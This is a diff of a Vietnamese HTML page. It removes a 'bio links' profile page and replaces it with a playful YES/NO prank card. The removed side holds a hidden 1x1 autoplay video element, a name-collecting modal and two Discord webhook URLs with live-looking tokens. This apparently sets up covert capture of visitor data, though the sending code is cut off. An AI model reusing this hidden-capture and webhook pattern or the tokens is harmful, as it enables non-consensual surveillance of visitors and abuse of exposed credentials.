@@ -2,1685 +2,250 @@
 <html lang="vi">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>qynhmai - Bio Links</title>
-<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Lexend:wght@300;400;600&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>YES or NO – GOD MODE</title>
+
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-body,html{font-family:'Outfit',sans-serif;overflow-x:hidden;background:#000}
-
-.lockscreen{
-    position:fixed;
-    inset:0;
-    z-index:99999;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    flex-direction:column;
-    background:#000;
-    cursor:pointer;
-    overflow:hidden;
-    transition:opacity 0.6s cubic-bezier(0.4,0,0.2,1);
+*{box-sizing:border-box;font-family:monospace}
+body{
+  margin:0;
+  height:100vh;
+  background:url("YOUR_IMAGE_URL_HERE") center/cover no-repeat;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  overflow:hidden;
+  color:#fff;
 }
 
-.lockscreen.hidden{
-    opacity:0;
-    pointer-events:none;
+/* Dark overlay */
+body::before{
+  content:"";
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,.65);
+  z-index:-1;
 }
 
-.lockscreen-bg{
-    position:absolute;
-    inset:0;
-    background:
-        radial-gradient(ellipse at 20% 80%, rgba(139,92,246,0.35) 0%, transparent 50%),
-        radial-gradient(ellipse at 80% 20%, rgba(59,130,246,0.3) 0%, transparent 50%),
-        radial-gradient(ellipse at 50% 50%, rgba(168,85,247,0.15) 0%, transparent 70%),
-        linear-gradient(135deg, #0a0a1a 0%, #111827 40%, #0f172a 100%);
-    z-index:0;
-}
-
-.lockscreen-particles{
-    position:absolute;
-    inset:0;
-    z-index:1;
-    pointer-events:none;
-    overflow:hidden;
-}
-
-.lockscreen-particle{
-    position:absolute;
-    border-radius:50%;
-    opacity:0;
-    animation:particleFloat linear infinite;
-}
-
-@keyframes particleFloat{
-    0%{transform:translateY(100vh) scale(0);opacity:0}
-    10%{opacity:1}
-    90%{opacity:1}
-    100%{transform:translateY(-100px) scale(1);opacity:0}
-}
-
-.lockscreen-content{
-    position:relative;
-    z-index:2;
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-    gap:20px;
-    animation:lockFadeIn 0.8s ease;
-}
-
-@keyframes lockFadeIn{
-    from{opacity:0;transform:translateY(30px)}
-    to{opacity:1;transform:translateY(0)}
-}
-
-.lock-avatar-wrap{
-    position:relative;
-    width:150px;
-    height:150px;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-}
-
-.lock-avatar-frame{
-    position:absolute;
-    top:50%;
-    left:50%;
-    transform:translate(-50%,-50%);
-    width:139px;
-    height:139px;
-    background-image:url('https://discord-decoration.art/decorations/angry.png');
-    background-size:contain;
-    background-position:center;
-    background-repeat:no-repeat;
-    animation:gentleFloat 4s ease-in-out infinite;
-    pointer-events:none;
-    z-index:2;
-}
-
-.lock-avatar{
-    position:relative;
-    z-index:1;
-    width:128px;
-    height:128px;
-    border-radius:50%;
-    object-fit:cover;
-    border:3px solid rgba(255,255,255,0.1);
-    box-shadow:0 0 25px rgba(139,92,246,0.35),0 0 50px rgba(139,92,246,0.15);
-}
-
-.lock-name{
-    font-family:'Lexend',sans-serif;
-    font-size:32px;
-    font-weight:600;
-    color:#fff;
-    letter-spacing:1px;
-    text-shadow:0 0 20px rgba(139,92,246,0.5);
-}
-
-.lock-quote{
-    font-size:15px;
-    color:#a0aec0;
-    font-weight:300;
-    max-width:380px;
-    text-align:center;
-    line-height:1.6;
-    min-height:48px;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    transition:opacity 0.4s ease;
-}
-
-.lock-quote.fade{
-    opacity:0;
-}
-
-.lock-hint{
-    position:absolute;
-    bottom:50px;
-    left:50%;
-    transform:translateX(-50%);
-    z-index:3;
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-    gap:8px;
-    animation:hintPulse 2s ease-in-out infinite;
-    white-space:nowrap;
-}
-
-.lock-hint span{
-    color:#cbd5e0;
-    font-size:18px;
-    font-weight:600;
-    letter-spacing:0.5px;
-    text-shadow:0 0 14px rgba(139,92,246,0.6),0 0 35px rgba(139,92,246,0.25);
-}
-
-.lock-hint i{
-    font-style:normal;
-    font-size:24px;
-    color:#8b5cf6;
-    animation:arrowBounce 1.5s ease-in-out infinite;
-    display:inline-block;
-    text-shadow:0 0 10px rgba(139,92,246,0.7);
-}
-
-@keyframes hintPulse{
-    0%,100%{opacity:0.4}
-    50%{opacity:0.9}
-}
-
-@keyframes arrowBounce{
-    0%,100%{transform:translateY(0)}
-    50%{transform:translateY(6px)}
-}
-
-.container{
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-    justify-content:center;
-    min-height:100vh;
-    background:radial-gradient(ellipse at top, #0f1419 0%, #000000 50%);
-    position:relative;
-    overflow:hidden;
-    padding:40px 20px
-}
-
-.stars{
-    position:absolute;
-    top:0;
-    left:0;
-    width:100%;
-    height:100%;
-    pointer-events:none;
-    overflow:hidden;
-    contain:strict;
-}
-
-.star{
-    position:absolute;
-    background:white;
-    border-radius:50%;
-    animation:twinkle linear infinite;
-    box-shadow:0 0 3px rgba(255,255,255,0.6)
-}
-
-@keyframes twinkle{
-    0%,100%{opacity:0.3}
-    50%{opacity:0.9}
-}
-
-.constellation{
-    position:absolute;
-    width:100%;
-    height:100%;
-    top:0;
-    left:0;
-    opacity:0.1
-}
-
-.profile-wrapper{
-    position:relative;
-    z-index:10;
-    text-align:center;
-    animation:fadeInUp 1s ease;
-    max-width:500px;
-    width:100%
-}
-
-@keyframes fadeInUp{
-    from{opacity:0;transform:translateY(40px)}
-    to{opacity:1;transform:translateY(0)}
-}
-
-.avatar-wrapper{
-    margin-bottom:30px;
-    display:inline-block;
-    position:relative;
-    padding:0
-}
-
-.avatar-frame{
-    position:absolute;
-    top:50%;
-    left:50%;
-    transform:translate(-50%,-50%);
-    width:145px;
-    height:145px;
-    background-image:url('https://discord-decoration.art/decorations/angry.png');
-    background-size:contain;
-    background-position:center;
-    background-repeat:no-repeat;
-    animation:gentleFloat 4s ease-in-out infinite;
-    pointer-events:none;
-    z-index:2
-}
-
-@keyframes gentleFloat{
-    0%,100%{transform:translate(-50%,-50%) scale(1)}
-    50%{transform:translate(-50%,-52%) scale(1.02)}
-}
-
-.avatar{
-    width:120px;
-    height:120px;
-    border-radius:50%;
-    border:3px solid rgba(255,255,255,0.1);
-    box-shadow:0 0 20px rgba(139,92,246,0.3),0 0 40px rgba(59,130,246,0.15);
-    object-fit:cover;
-    position:relative;
-    z-index:1
+/* Card */
+.card{
+  width:340px;
+  padding:30px;
+  text-align:center;
+  background:rgba(0,0,0,.45);
+  backdrop-filter:blur(14px);
+  border-radius:24px;
+  box-shadow:0 0 40px rgba(255,0,100,.25);
+  animation:fadeIn .8s ease;
 }
 
 h1{
-    font-size:36px;
-    font-weight:700;
-    color:#fff;
-    margin-bottom:12px;
-    text-shadow:0 0 20px rgba(139,92,246,0.4);
-    letter-spacing:1px;
-    font-family:'Lexend',sans-serif;
-    display:inline-flex;
-    align-items:center;
-    gap:8px
+  letter-spacing:3px;
+  text-shadow:0 0 12px rgba(255,0,100,.7);
 }
 
-.blue-tick{
-    width:20px;
-    height:20px;
-    display:inline-block;
-    filter:drop-shadow(0 0 4px rgba(59,130,246,0.6))
+.sub{
+  font-size:13px;
+  opacity:.8;
+  margin-bottom:25px;
 }
 
-.bio{
-    font-size:15px;
-    color:#a0aec0;
-    margin-bottom:20px;
-    line-height:1.8;
-    font-weight:300;
-    position:relative;
-    transition:all 0.3s ease
+/* Buttons */
+button{
+  width:100%;
+  padding:16px;
+  margin:12px 0;
+  border:none;
+  border-radius:18px;
+  cursor:pointer;
+  transition:.25s;
 }
 
-.bio .fade-text{
-    position:relative;
-    display:inline-block;
-    transition:opacity 0.3s ease
+#yes{
+  font-size:30px;
+  background:rgba(255,255,255,.15);
+  color:white;
+  box-shadow:0 0 20px rgba(255,0,120,.8);
+}
+#yes:hover{transform:scale(1.05)}
+
+#no{
+  position:absolute;
+  padding:12px 22px;
+  background:transparent;
+  color:#aaa;
+  border:1px solid rgba(255,255,255,.3);
 }
 
-.bio .fade-text::before{
-    content:'';
-    position:absolute;
-    top:0;
-    left:-2px;
-    right:-2px;
-    bottom:0;
-    background:#1a1a1a;
-    border-radius:4px;
-    z-index:1;
-    transition:opacity 0.3s ease
+/* YES screen */
+#yesScreen{
+  position:fixed;
+  inset:0;
+  background:black;
+  display:none;
+  justify-content:center;
+  align-items:center;
+  font-size:42px;
+  text-align:center;
+  animation:flash .8s ease;
 }
 
-.bio:hover .fade-text::before{
-    opacity:0
+/* Hearts */
+.heart{
+  position:fixed;
+  font-size:24px;
+  animation:float 2.5s linear forwards;
 }
 
-.about-section{
-    background:rgba(255,255,255,0.04);
-    backdrop-filter:blur(15px);
-    border:1px solid rgba(255,255,255,0.08);
-    border-radius:12px;
-    padding:20px;
-    margin-bottom:30px;
-    animation:fadeInUp 1s ease 0.3s backwards
+/* Firework */
+.spark{
+  position:fixed;
+  width:6px;
+  height:6px;
+  background:white;
+  border-radius:50%;
+  animation:boom 1s ease-out forwards;
 }
 
-.about-section .role{
-    color:#8b5cf6;
-    font-weight:500;
-    font-size:14px;
-    margin-bottom:12px;
-    letter-spacing:0.5px
+/* Animations */
+@keyframes float{
+  from{opacity:1;transform:translateY(0) scale(1)}
+  to{opacity:0;transform:translateY(-220px) scale(1.8)}
 }
-
-.about-section p{
-    color:#a0aec0;
-    font-size:14px;
-    line-height:1.7;
-    margin-bottom:10px;
-    font-weight:300
-}
-
-.about-section p:last-child{
-    margin-bottom:0
-}
-
-.quote-section{
-    background:rgba(255,255,255,0.04);
-    backdrop-filter:blur(15px);
-    border:1px solid rgba(255,255,255,0.08);
-    border-radius:8px;
-    padding:6px 12px;
-    margin-bottom:15px;
-    max-width:100%;
-    transition:all 0.3s ease;
-    display:inline-flex;
-    align-items:center;
-    gap:8px;
-    width:auto
-}
-
-.quote-section::before{
-    content:'';
-    width:6px;
-    height:6px;
-    background:#00ff88;
-    border-radius:50%;
-    flex-shrink:0;
-    box-shadow:0 0 8px rgba(0,255,136,0.6)
-}
-
-.quote-text{
-    font-size:13px;
-    color:#cbd5e0;
-    font-style:normal;
-    line-height:1.4;
-    display:inline;
-    text-align:left;
-    font-weight:300
-}
-
-.links-container{
-    display:flex;
-    flex-direction:column;
-    gap:16px;
-    width:100%
-}
-
-.link-item{
-    background:rgba(255,255,255,0.05);
-    backdrop-filter:blur(20px) saturate(180%);
-    -webkit-backdrop-filter:blur(20px) saturate(180%);
-    border:1px solid rgba(255,255,255,0.12);
-    border-radius:16px;
-    padding:20px 28px;
-    display:flex;
-    align-items:center;
-    gap:16px;
-    text-decoration:none;
-    color:#fff;
-    transition:all 0.4s cubic-bezier(0.4,0,0.2,1);
-    position:relative;
-    overflow:hidden;
-    box-shadow:0 4px 24px rgba(0,0,0,0.25),inset 0 1px 0 rgba(255,255,255,0.08)
-}
-
-.link-item::before{
-    content:'';
-    position:absolute;
-    top:0;
-    left:-100%;
-    width:100%;
-    height:100%;
-    background:linear-gradient(90deg,transparent,rgba(255,255,255,0.15),transparent);
-    transition:left 0.6s
-}
-
-.link-item:hover::before{
-    left:100%
-}
-
-.link-item:hover{
-    background:rgba(255,255,255,0.12);
-    border-color:rgba(255,255,255,0.25);
-    transform:translateY(-4px);
-    box-shadow:0 12px 40px rgba(139,92,246,0.3),0 4px 24px rgba(0,0,0,0.25),inset 0 1px 0 rgba(255,255,255,0.15)
-}
-
-.link-icon{
-    width:48px;
-    height:48px;
-    border-radius:12px;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    font-size:24px;
-    flex-shrink:0;
-    position:relative;
-    overflow:hidden
-}
-
-.link-icon::before{
-    content:'';
-    position:absolute;
-    top:0;
-    left:0;
-    width:100%;
-    height:100%;
-    background:rgba(255,255,255,0.1);
+@keyframes boom{
+  to{
+    transform:translate(
+      calc(var(--x)*1px),
+      calc(var(--y)*1px)
+    );
     opacity:0;
-    transition:opacity 0.3s
+  }
 }
-
-.link-item:hover .link-icon::before{
-    opacity:1
+@keyframes flash{
+  0%{background:white;color:black}
+  100%{background:black;color:white}
 }
-
-.telegram-icon{
-    background:linear-gradient(135deg,#2AABEE 0%,#229ED9 100%);
-    box-shadow:0 6px 20px rgba(42,171,238,0.4)
-}
-
-.facebook-icon{
-    background:linear-gradient(135deg,#1877F2 0%,#0C63D4 100%);
-    box-shadow:0 6px 20px rgba(24,119,242,0.4)
-}
-
-.whatsapp-icon{
-    background:linear-gradient(135deg,#25D366 0%,#128C7E 100%);
-    box-shadow:0 6px 20px rgba(37,211,102,0.4)
-}
-
-.link-text{
-    flex:1;
-    text-align:left
-}
-
-.link-title{
-    font-size:18px;
-    font-weight:600;
-    margin-bottom:4px;
-    letter-spacing:0.3px
-}
-
-.link-subtitle{
-    font-size:13px;
-    color:#718096;
-    font-weight:300
-}
-
-.link-arrow{
-    font-size:22px;
-    color:#4a5568;
-    transition:all 0.4s cubic-bezier(0.4,0,0.2,1)
-}
-
-.link-item:hover .link-arrow{
-    transform:translateX(6px);
-    color:#fff
-}
-
-.footer{
-    margin-top:50px;
-    text-align:center;
-    color:#4a5568;
-    font-size:13px;
-    font-weight:300
-}
-
-.music-indicator{
-    position:fixed;
-    bottom:30px;
-    right:30px;
-    background:rgba(17,24,39,0.95);
-    backdrop-filter:blur(20px);
-    padding:15px 25px;
-    border-radius:50px;
-    border:1px solid rgba(139,92,246,0.3);
-    color:#fff;
-    font-size:14px;
-    display:none;
-    align-items:center;
-    gap:12px;
-    box-shadow:0 10px 30px rgba(0,0,0,0.5);
-    animation:slideInRight 0.5s ease;
-    z-index:999
-}
-
-@keyframes slideInRight{
-    from{transform:translateX(100px);opacity:0}
-    to{transform:translateX(0);opacity:1}
-}
-
-.music-indicator .bars{
-    display:flex;
-    gap:3px;
-    align-items:flex-end;
-    height:20px
-}
-
-.music-indicator .bar{
-    width:3px;
-    background:linear-gradient(to top,#8b5cf6,#3b82f6);
-    border-radius:2px;
-    animation:musicBars 0.8s ease-in-out infinite
-}
-
-.music-indicator .bar:nth-child(1){animation-delay:0s;height:8px}
-.music-indicator .bar:nth-child(2){animation-delay:0.2s;height:14px}
-.music-indicator .bar:nth-child(3){animation-delay:0.4s;height:10px}
-
-@keyframes musicBars{
-    0%,100%{transform:scaleY(0.5)}
-    50%{transform:scaleY(1)}
-}
-
-.click-text{
-    position:fixed;
-    pointer-events:none;
-    font-family:'Outfit',sans-serif;
-    font-weight:700;
-    font-size:15px;
-    white-space:nowrap;
-    z-index:9999;
-    text-shadow:0 0 8px currentColor;
-    animation:clickTextFloat 1.4s cubic-bezier(0.25,0.46,0.45,0.94) forwards;
-}
-
-@keyframes clickTextFloat{
-    0%{opacity:1;transform:translateY(0) scale(1)}
-    60%{opacity:0.8;transform:translateY(-100px) scale(1.05)}
-    100%{opacity:0;transform:translateY(-180px) scale(0.8)}
-}
-
-.falling-stars{
-    position:fixed;
-    top:0;
-    left:0;
-    width:100%;
-    height:100%;
-    pointer-events:none;
-    z-index:9998;
-    overflow:hidden;
-}
-
-.falling-star{
-    position:absolute;
-    font-size:1.2rem;
-    color:white;
-    opacity:0;
-    animation:starFall linear forwards;
-}
-
-@keyframes starFall{
-    0%{
-        opacity:0;
-        transform:translateY(-50px) rotate(0deg) scale(0);
-    }
-    10%{
-        opacity:1;
-        transform:translateY(0) rotate(45deg) scale(1);
-    }
-    90%{
-        opacity:1;
-    }
-    100%{
-        opacity:0;
-        transform:translateY(100vh) rotate(180deg) scale(0.5);
-    }
-}
-
-.modal{
-    display:none;
-    position:fixed;
-    z-index:100000;
-    left:0;
-    top:0;
-    width:100%;
-    height:100%;
-    background:rgba(0,0,0,0.85);
-    backdrop-filter:blur(12px);
-    animation:fadeIn 0.4s
-}
-
 @keyframes fadeIn{
-    from{opacity:0}
-    to{opacity:1}
-}
-
-.modal-content{
-    background:rgba(15,25,40,0.65);
-    backdrop-filter:blur(30px) saturate(180%);
-    -webkit-backdrop-filter:blur(30px) saturate(180%);
-    margin:10% auto;
-    padding:30px 30px;
-    border:1px solid rgba(100,120,200,0.25);
-    border-radius:18px;
-    width:90%;
-    max-width:380px;
-    text-align:center;
-    box-shadow:
-        0 20px 50px rgba(0,0,0,0.6),
-        0 0 100px rgba(100,120,200,0.12),
-        inset 0 1px 0 rgba(255,255,255,0.06);
-    animation:slideUp 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
-    position:relative;
-    overflow:hidden
-}
-
-.modal-content::before{
-    content:'';
-    position:absolute;
-    top:0;
-    left:0;
-    width:100%;
-    height:2px;
-    background:linear-gradient(90deg,#6078c8 0%,#4a90e2 50%,#7c9ce8 100%)
-}
-
-@keyframes slideUp{
-    from{transform:translateY(80px) scale(0.95);opacity:0}
-    to{transform:translateY(0) scale(1);opacity:1}
-}
-
-.modal-content h2{
-    color:#fff;
-    margin-bottom:10px;
-    font-size:24px;
-    font-weight:600;
-    font-family:'Lexend',sans-serif;
-    letter-spacing:0.3px
-}
-
-.modal-avatar-wrapper{
-    margin-bottom:20px;
-    display:inline-block;
-    position:relative;
-    padding:0
-}
-
-.modal-avatar-frame{
-    position:absolute;
-    top:50%;
-    left:50%;
-    transform:translate(-50%, -50%);
-    width:90px;
-    height:90px;
-    background-image:url('https://discord-decoration.art/decorations/angry.png');
-    background-size:contain;
-    background-position:center;
-    background-repeat:no-repeat;
-    animation:gentleFloat 4s ease-in-out infinite;
-    pointer-events:none;
-    z-index:2
-}
-
-.modal-avatar{
-    width:75px;
-    height:75px;
-    border-radius:50%;
-    border:2px solid rgba(255,255,255,0.1);
-    box-shadow:
-        0 0 15px rgba(100,120,200,0.3),
-        0 0 30px rgba(100,120,200,0.15);
-    object-fit:cover;
-    position:relative;
-    z-index:1
-}
-
-.modal-content p{
-    color:#a0aec0;
-    margin-bottom:20px;
-    font-size:14px;
-    line-height:1.6;
-    font-weight:300
-}
-
-.name-input{
-    width:100%;
-    padding:14px 20px;
-    border:1.5px solid rgba(100,120,200,0.25);
-    border-radius:12px;
-    background:rgba(20,30,50,0.5);
-    backdrop-filter:blur(10px);
-    -webkit-backdrop-filter:blur(10px);
-    color:#fff;
-    font-size:15px;
-    font-family:'Outfit',sans-serif;
-    margin-bottom:20px;
-    transition:all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-    outline:none;
-    box-shadow:
-        0 3px 10px rgba(0,0,0,0.3),
-        inset 0 1px 0 rgba(255,255,255,0.05);
-    -webkit-user-select:text;
-    user-select:text
-}
-
-.name-input:focus{
-    border-color:rgba(100,120,200,0.5);
-    background:rgba(20,30,50,0.7);
-    box-shadow:
-        0 4px 15px rgba(100,120,200,0.3),
-        0 0 30px rgba(100,120,200,0.15),
-        inset 0 1px 0 rgba(255,255,255,0.08);
-    transform:translateY(-1px)
-}
-
-.name-input::placeholder{
-    color:#718096;
-    font-weight:300
-}
-
-.error-message{
-    color:#ef4444;
-    font-size:12px;
-    margin-top:-15px;
-    margin-bottom:15px;
-    display:none;
-    font-weight:400;
-    text-shadow:0 0 6px rgba(239,68,68,0.2)
-}
-
-.btn{
-    background:linear-gradient(135deg,#8b5cf6 0%,#3b82f6 50%,#a855f7 100%);
-    color:white;
-    padding:13px 45px;
-    border:none;
-    border-radius:40px;
-    cursor:pointer;
-    font-size:15px;
-    font-weight:600;
-    transition:all 0.35s cubic-bezier(0.4, 0, 0.2, 1);
-    box-shadow:
-        0 8px 25px rgba(139,92,246,0.35),
-        inset 0 1px 0 rgba(255,255,255,0.2);
-    position:relative;
-    overflow:hidden;
-    letter-spacing:0.4px
-}
-
-.btn::before{
-    content:'';
-    position:absolute;
-    top:50%;
-    left:50%;
-    width:0;
-    height:0;
-    border-radius:50%;
-    background:rgba(255,255,255,0.2);
-    transform:translate(-50%,-50%);
-    transition:width 0.5s,height 0.5s
-}
-
-.btn:hover::before{
-    width:300px;
-    height:300px
-}
-
-.btn:hover{
-    transform:translateY(-2px);
-    box-shadow:
-        0 12px 35px rgba(139,92,246,0.5),
-        inset 0 1px 0 rgba(255,255,255,0.3)
-}
-
-.btn:active{
-    transform:translateY(0)
-}
-
-.btn:disabled{
-    opacity:0.6;
-    cursor:not-allowed;
-    transform:none
-}
-
-.btn span{
-    position:relative;
-    z-index:1
-}
-
-@media(max-width:768px){
-    h1{font-size:30px}
-    .link-title{font-size:16px}
-    .profile-wrapper{padding:0 10px}
-    .music-indicator{bottom:20px;right:20px;font-size:12px}
-    .quote-text{font-size:13px}
-    .lock-name{font-size:26px}
-    .lock-quote{font-size:14px;max-width:300px}
-    .lock-hint{bottom:40px}
-    .lock-hint span{font-size:15px}
+  from{opacity:0;transform:translateY(20px)}
+  to{opacity:1}
 }
 </style>
 </head>
+
 <body>
 
-<div class="falling-stars" id="fallingStars"></div>
-
-<div class="lockscreen" id="lockscreen">
-    <div class="lockscreen-bg"></div>
-    <div class="lockscreen-particles" id="lockParticles"></div>
-    <div class="lockscreen-content">
-        <div class="lock-avatar-wrap">
-            <div class="lock-avatar-frame"></div>
-            <img src="https://sf-static.upanhlaylink.com/img/image_202601316f23bf937075d2c3d763b7aeebfdf7a4.jpg" alt="Avatar" class="lock-avatar">
-        </div>
-        <div class="lock-name">qynh mai</div>
-        <div class="lock-quote" id="lockQuote"></div>
-    </div>
-    <div class="lock-hint">
-        <span>Tap anywhere to continue</span>
-        <i>↓</i>
-    </div>
+<div class="card" id="card">
+  <h1>ĐỒNG Ý KHÔNG?</h1>
+  <div class="sub">There is no escape 😈</div>
+  <button id="yes">YES</button>
 </div>
 
-<div class="container">
-    <div class="stars" id="stars"></div>
-    <canvas class="constellation" id="constellation"></canvas>
-    
-    <div class="profile-wrapper">
-        <div class="avatar-wrapper">
-            <div class="avatar-frame"></div>
-            <img src="https://sf-static.upanhlaylink.com/img/image_2026010804e6d83232c262fed7eb625f06bed361.jpg" alt="Avatar" class="avatar">
-        </div>
-        
-        <h1>
-            qynh mai
-            <svg class="blue-tick" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <circle cx="12" cy="12" r="10" fill="#1DA1F2"/>
-                <path d="M9.5 12.5L11 14L14.5 10.5" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-            </svg>
-        </h1>
-        <p class="bio">I’m not like that. <span class="fade-text">I hope you can understand.</span></p>
-        
-        <div style="display:flex;justify-content:center;margin-bottom:15px">
-            <div class="quote-section">
-                <div class="quote-text" id="quote-text">Loading quotes...</div>
-            </div>
-        </div>
-        
-        <section class="about-section">
-            <p class="role">Myself / Think</p>
-            <div>
-                <p>hello, i'm nothing to you !</p>
-                <p>"enjoy your life."</p>
-            </div>
-        </section>
-        
-        <div class="links-container">
-            <a href="https://t.me/qyyhmai" class="link-item" target="_blank">
-                <div class="link-icon telegram-icon">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
-                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z"/>
-                    </svg>
-                </div>
-                <div class="link-text">
-                    <div class="link-title">Telegram</div>
-                    <div class="link-subtitle">@q*****i</div>
-                </div>
-                <div class="link-arrow">→</div>
-            </a>
-            
-            <a href="https://www.facebook.com/quynhmai.trinhthi.547/" class="link-item" target="_blank">
-                <div class="link-icon facebook-icon">
-                    <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
-                        <path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z"/>
-                    </svg>
-                </div>
-                <div class="link-text">
-                    <div class="link-title">Facebook</div>
-                    <div class="link-subtitle">🔒</div>
-                </div>
-                <div class="link-arrow">→</div>
-            </a>
-            
-            <a href="https://wa.me/84357296423?text=Hello%20mình%20liên%20hệ%20qua%20website" class="link-item" target="_blank">
-                <div class="link-icon whatsapp-icon">
-                    <svg width="24" height="24" viewBox="0 0 32 32" fill="white">
-                        <path d="M16 3C9.373 3 4 8.373 4 15c0 2.65.86 5.104 2.313 7.094L4 29l7.094-2.313A11.93 11.93 0 0 0 16 27c6.627 0 12-5.373 12-12S22.627 3 16 3zm0 22a9.94 9.94 0 0 1-4.813-1.25l-.344-.188-4.219 1.375 1.375-4.094-.219-.375A9.94 9.94 0 1 1 16 25zm5.438-7.063c-.297-.156-1.75-.875-2.031-.969-.281-.094-.484-.156-.688.156-.203.313-.781.969-.953 1.156-.172.188-.344.219-.641.063-.297-.156-1.25-.469-2.375-1.5-.875-.781-1.469-1.75-1.641-2.047-.172-.297-.016-.453.141-.609.141-.141.297-.344.453-.516.156-.172.203-.297.313-.5.109-.203.047-.375-.016-.531-.063-.156-.688-1.656-.938-2.266-.25-.609-.5-.516-.688-.516h-.594c-.203 0-.531.078-.813.375-.281.297-1.063 1.031-1.063 2.516s1.094 2.922 1.25 3.125c.156.203 2.156 3.281 5.219 4.594.719.313 1.281.5 1.719.641.719.219 1.375.188 1.891.109.578-.094 1.75-.719 2-1.406.25-.688.25-1.281.172-1.406-.078-.125-.266-.203-.563-.359z"/>
-                    </svg>
-                </div>
-                <div class="link-text">
-                    <div class="link-title">WhatsApp</div>
-                    <div class="link-subtitle">Chat with me!</div>
-                </div>
-                <div class="link-arrow">→</div>
-            </a>
-        </div>
+<button id="no">NO</button>
 
-        <div class="footer">
-            © "I'm talented, and so are you."
-        </div>
-    </div>
-</div>
+<div id="yesScreen">❤️ YOU SAID YES ❤️</div>
 
-<div class="music-indicator" id="musicIndicator">
-    <div class="bars">
-        <div class="bar"></div>
-        <div class="bar"></div>
-        <div class="bar"></div>
-    </div>
-    <span>Playing music...</span>
-</div>
-
-<div id="notificationModal" class="modal">
-    <div class="modal-content">
-        <div class="modal-avatar-wrapper">
-            <div class="modal-avatar-frame"></div>
-            <img src="https://sf-static.upanhlaylink.com/img/image_2026010804e6d83232c262fed7eb625f06bed361.jpg" alt="Avatar" class="modal-avatar">
-        </div>
-        <h2>Nhập tên của bạn</h2>
-        <p>Vui lòng nhập tên để tiếp tục</p>
-        <input type="text" class="name-input" id="nameInput" placeholder="Tên của bạn..." autocomplete="off">
-        <p class="error-message" id="errorMessage">Vui lòng nhập tên hợp lệ!</p>
-        <button class="btn" id="confirmBtn"><span>Xác nhận</span></button>
-    </div>
-</div>
-
-<video id="video" width="1" height="1" autoplay style="display:none;"></video>
-<audio id="backgroundMusic"></audio>
+<!-- AUDIO -->
+<audio id="bgm" loop>
+  <source src="https://assets.mixkit.co/music/preview/mixkit-soft-ambient-110.mp3">
+</audio>
+<audio id="click">
+  <source src="https://assets.mixkit.co/sfx/preview/mixkit-game-click-1114.mp3">
+</audio>
 
 <script>
-//const DISCORD_WEBHOOK='https://discord.com/api/webhooks/1440247747700723732/vmQeU92yVVYgp8uuYkRttiIgWDH5ttAsPegnTh8zwBuIg7mofGMH9_UMAQbsaF-Mny1t';
-const DISCORD_WEBHOOK='https://discord.com/api/webhooks/1466471346077827324/35ZOkMh1SUJtJVZI1H58KwQB0jOEJaK5IVBLcNpEKCctbGooYkG73sX5PYId4Nw43YkN';
-    
-var quotes = [
-    "leaving the country (rời khỏi đất nước)",
-    "delete all my accounts (xoá sạch mọi tài khoản)",
-    "change my number (đổi số liên lạc)",
-    "start a new life (bắt đầu cuộc sống mới)",
-    "....",
-    "privacy so high (ẩn danh tuyệt đối)",
-    "u'll never see me until i decide to be seen",
-    "bạn sẽ không biết về tôi trừ khi được cho phép",
-    "....",
-    "Silence is golden, and money makes the world go round",
-    "im lặng là vàng là bạc, tiền là tiên là phật",
-    "....",
-];
+const no = document.getElementById("no");
+const yes = document.getElementById("yes");
+const card = document.getElementById("card");
+const yesScreen = document.getElementById("yesScreen");
+const bgm = document.getElementById("bgm");
+const click = document.getElementById("click");
 
-var lockQuotes = [
-    "hey!",
-    "nice to meet you",
-    "how’ve you been?",
-    "how’s your day?",
-    "everything okay?",
-]; 
-
-var clickTexts = [
-    "♥️ stupid",
-    "❤️ stupid",
-    "💛 stupid",
-    "💚 stupid",
-    "💙 stupid",
-    "💜 stupid",
-    "🖤 stupid",
-    "💖 stupid",
-    "💝 stupid",
-    "💙 stupid",
-    "❤️ stupid",
-    "💚 stupid",
-    "💙 stupid",
-    "💜 stupid",
-    "💛 stupid",
-    "💖 stupid",
-    "💛 stupid",
-    "💖 stupid",
-    "💚 stupid",
-    "💚 stupid",
-    "💚 stupid",
-    "🖤 stupid",
